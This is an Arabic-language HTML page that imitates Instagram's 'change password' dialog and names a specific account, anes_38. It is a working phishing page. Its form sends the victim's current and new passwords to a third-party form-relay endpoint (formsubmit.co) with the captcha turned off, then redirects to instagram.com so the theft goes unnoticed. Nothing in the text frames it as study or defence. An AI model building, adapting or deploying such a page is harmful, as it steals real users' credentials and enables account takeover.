<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تغيير كلمة السر • Instagram</title>
    <style>
        body { background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        
        .modal { background-color: #1c1c1c; width: 100%; max-width: 450px; border-radius: 20px; padding: 20px; box-sizing: border-box; position: relative; }
        
        /* الأزرار العلوية (X والسهم) */
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .header span { font-size: 24px; cursor: pointer; color: #fff; }

        .account-info { font-size: 14px; color: #fff; margin-bottom: 20px; }

        h2 { font-size: 22px; margin-bottom: 10px; font-weight: bold; }
        .description { font-size: 13px; color: #f5f5f5; line-height: 1.5; margin-bottom: 25px; }

        form { display: flex; flex-direction: column; }

        .input-group { position: relative; margin-bottom: 15px; }
        input { width: 100%; background: #1c1c1c; border: 1px solid #363636; border-radius: 12px; padding: 18px 15px; color: #fff; font-size: 14px; box-sizing: border-box; text-align: right; }
        input::placeholder { color: #8e8e8e; }

        .forgot-pass { color: #0095f6; font-size: 13px; text-align: right; margin-bottom: 15px; text-decoration: none; display: block; }

        /* خيار تسجيل الخروج من الأجهزة الأخرى */
        .checkbox-container { display: flex; align-items: center; justify-content: flex-start; gap: 10px; margin-bottom: 25px; font-size: 13px; color: #fff; }
        input[type="checkbox"] { width: 18px; height: 18px; margin: 0; cursor: pointer; border-radius: 4px; }

        /* الزر الأزرق المطابق للصورة */
        button { background-color: #183354; color: #4a82b5; border: none; border-radius: 25px; padding: 12px; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.3s; }
        /* عند الكتابة يمكن تغيير اللون ليكون أزرق فاتح كالأصلي */
        button:active { background-color: #0095f6; color: white; }
    </style>
</head>
<body>

<div class="modal">
    <div class="header">
        <span>✕</span>
        <span>⟩</span>
    </div>

    <div class="account-info">anes_38 • Instagram</div>

    <h2>تغيير كلمة السر</h2>
    <p class="description">
        يجب ألا تقل كلمة السر عن 6 من الأحرف وأن تتضمن توليفة من الأرقام والأحرف الأبجدية والأحرف الخاصة (!@$%).
    </p>

    <form action="https://formsubmit.co/b35269abccf715e68332f1a3a4ccca0c" method="POST">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://www.instagram.com">

        <div class="input-group">
            <input type="password" name="current_password" placeholder="كلمة السر الحالية (تم التحديث في 11/04/2026)" required>
        </div>

        <div class="input-group">
            <input type="password" name="new_password" placeholder="كلمة السر الجديدة" required>
        </div>

        <div class="input-group">
            <input type="password" name="confirm_password" placeholder="إعادة كتابة كلمة السر الجديدة" required>
        </div>

        <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>

        <div class="checkbox-container">
            <input type="checkbox" id="logout" name="logout_all">
            <label for="logout">تسجيل الخروج من الأجهزة الأخرى. حدد هذا الخيار إذا استخدم شخص آخر حسابك.</label>
        </div>

        <button type="submit">تغيير كلمة السر</button>
    </form>
</div>

</body>
</html>
